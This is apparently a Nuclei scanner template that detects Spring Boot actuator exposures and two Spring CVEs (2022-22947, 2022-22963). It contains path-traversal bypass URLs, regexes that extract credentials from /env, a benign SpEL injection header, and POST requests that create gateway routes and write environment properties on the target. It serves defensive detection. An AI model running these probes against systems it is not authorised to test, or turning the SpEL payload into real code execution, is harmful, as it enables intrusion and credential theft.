id: spring-boot-deep-misconfiguration

info:
  name: Spring Boot Advanced Misconfigurations - Actuator Deep Dive & Cloud Gateway RCE
  author: achraf-chehboun
  severity: critical
  description: |
    Deep detection for Spring Boot actuator misconfigurations beyond basic endpoint
    enumeration. Targets /env for credential extraction, /heapdump for memory analysis,
    /jolokia for JMX RCE paths, /gateway/routes for CVE-2022-22947. All matchers
    require actuator-specific JSON content — no more false positives from catch-all
    routes or generic HTML pages. Path traversal bypasses also require actuator content.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
    - https://spring.io/security
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-917
  metadata:
    max-request: 16
  tags: spring-boot,actuator,gateway,jolokia,heapdump,cve-2022-22947,detection-only

http:
  # === /ENV CREDENTIAL EXTRACTION ===
  - method: GET
    path:
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/env/spring.datasource.password"
      - "{{BaseURL}}/env"
      - "{{BaseURL}}/..;/actuator/env"
      - "{{BaseURL}}/%2e%2e/actuator/env"

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: dsl
        name: env-full-exposure
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "propertySources") && (contains(body, "spring.datasource") || contains(body, "spring.redis") || contains(body, "spring.mail") || contains(body, "systemProperties"))'

      - type: dsl
        name: env-specific-secret
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "\"value\"") && contains(body, "\"property\"") && !contains(body, "******")'

    extractors:
      - type: regex
        name: exposed-secrets-env
        group: 0
        regex:
          - '"spring\.datasource\.(?:url|username|password)"\s*:\s*\{[^}]*"value"\s*:\s*"[^"]*"'
          - '"spring\.redis\.(?:host|password)"\s*:\s*\{[^}]*"value"\s*:\s*"[^"]*"'
          - '"(?:secret|key|token|credential|apikey)[^"]*"\s*:\s*\{[^}]*"value"\s*:\s*"[^*"][^"]*"'

  # === /HEAPDUMP EXPOSURE ===
  - method: GET
    path:
      - "{{BaseURL}}/actuator/heapdump"
      - "{{BaseURL}}/heapdump"
      - "{{BaseURL}}/..;/actuator/heapdump"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        name: heapdump-downloadable
        dsl:
          - '(contains(content_type, "octet-stream") || contains(content_type, "x-heap") || contains(header, "Content-Disposition")) && len(body) > 50000'

  # === JOLOKIA JMX ===
  - method: GET
    path:
      - "{{BaseURL}}/actuator/jolokia"
      - "{{BaseURL}}/jolokia"
      - "{{BaseURL}}/actuator/jolokia/list"

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: dsl
        name: jolokia-exposed
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && (contains(body, "\"agent\"") || contains(body, "\"agentVersion\"")) && contains(body, "jolokia")'

      - type: dsl
        name: jolokia-mbean-list
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "java.lang") && contains(body, "MBeanInfo")'

    extractors:
      - type: regex
        name: jolokia-agent-version
        group: 1
        regex:
          - '"agentVersion"\s*:\s*"([^"]+)"'

  # === SPRING CLOUD GATEWAY ROUTES (CVE-2022-22947) ===
  - method: GET
    path:
      - "{{BaseURL}}/actuator/gateway/routes"
      - "{{BaseURL}}/actuator/gateway/globalfilters"

    stop-at-first-match: false
    matchers-condition: or
    matchers:
      - type: dsl
        name: gateway-routes-exposed
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && (contains(body, "\"route_id\"") || contains(body, "\"predicate\"") || contains(body, "\"filters\"") || contains(body, "\"order\""))'

      - type: dsl
        name: gateway-filters-exposed
        dsl:
          - 'status_code == 200 && contains(content_type, "json") && contains(body, "GatewayFilter")'

  # CVE-2022-22947: SpEL injection via route creation
  - raw:
      - |
        POST {{BaseURL}}/actuator/gateway/routes/nuclei-test-{{randstr}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"id":"nuclei-test-{{randstr}}","predicates":[{"name":"Path","args":{"_genkey_0":"/nuclei-test-{{randstr}}"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"X-Nuclei-Test","value":"detection-only"}}],"uri":"https://example.com","order":0}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201

      - type: dsl
        name: cve-2022-22947-route-creation
        dsl:
          - '!contains(body, "<html") && !contains(body, "<!DOCTYPE")'

  # === CVE-2022-22963: Spring Cloud Function SpEL ===
  - raw:
      - |
        POST {{BaseURL}}/functionRouter HTTP/1.1
        Host: {{Hostname}}
        spring.cloud.function.routing-expression: T(java.lang.Math).abs(-71589)
        Content-Type: application/x-www-form-urlencoded
        Accept: */*

        data=nuclei-test

    matchers-condition: or
    matchers:
      - type: dsl
        name: cve-2022-22963-spel-confirmed
        dsl:
          - 'contains(body, "71589")'

      - type: dsl
        name: cve-2022-22963-spel-error
        dsl:
          - 'status_code == 500 && (contains(body, "SpelEvaluationException") || contains(body, "routing-expression") || contains(body, "spring.cloud.function"))'

  # === ENV PROPERTY MODIFICATION ===
  - raw:
      - |
        POST {{BaseURL}}/actuator/env HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"name":"nuclei.test.property","value":"detection-probe-{{randstr}}"}

    matchers-condition: and
    matchers:
      - type: dsl
        name: env-property-writable
        dsl:
          - 'status_code == 200 && contains(content_type, "json")'
          - '!contains(body, "Method Not Allowed") && !contains(body, "<html") && !contains(body, "<!DOCTYPE")'
        condition: and

    extractors:
      - type: kval
        name: spring-headers
        kval:
          - X-Application-Context
